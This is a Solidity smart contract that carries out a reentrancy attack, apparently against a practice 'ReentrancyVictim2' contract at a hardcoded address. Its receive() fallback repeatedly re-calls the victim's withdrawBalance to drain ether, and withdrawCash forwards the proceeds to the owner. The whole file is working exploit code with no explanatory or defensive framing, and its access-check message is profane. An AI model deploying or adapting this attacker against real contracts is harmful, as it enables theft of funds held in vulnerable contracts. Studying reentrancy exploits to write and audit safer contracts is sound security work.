// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {ReentrancyVictim2} from "./victim.sol";

contract ReentrancyAttacker2 {
    ReentrancyVictim2 victim;
    address public owner;

    address public pray = 0x8c8390b0C0fBEba7785b80BC4F0EFBA6dc285b47;
    //0x7A83fa0AA2dF3790e1015477a6b5464a115aa777

    constructor() {
        victim = ReentrancyVictim2(pray);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Fuck off !!!");
        _;
    }

    function attack() public payable onlyOwner {
        // depositing to contract
        victim.deposit{value: 0.1 ether}(); // sending from contract to victim

        victim.withdrawBalance();
    }

    function withdrawCash() public onlyOwner {
        uint256 balance = address(this).balance;

        (bool success,) = msg.sender.call{value: balance}("");
        if (!success) {
            revert();
        }
    }

    receive() external payable {
        if (address(victim).balance >= 0.1 ether) {
            victim.withdrawBalance();
        }
    }
}
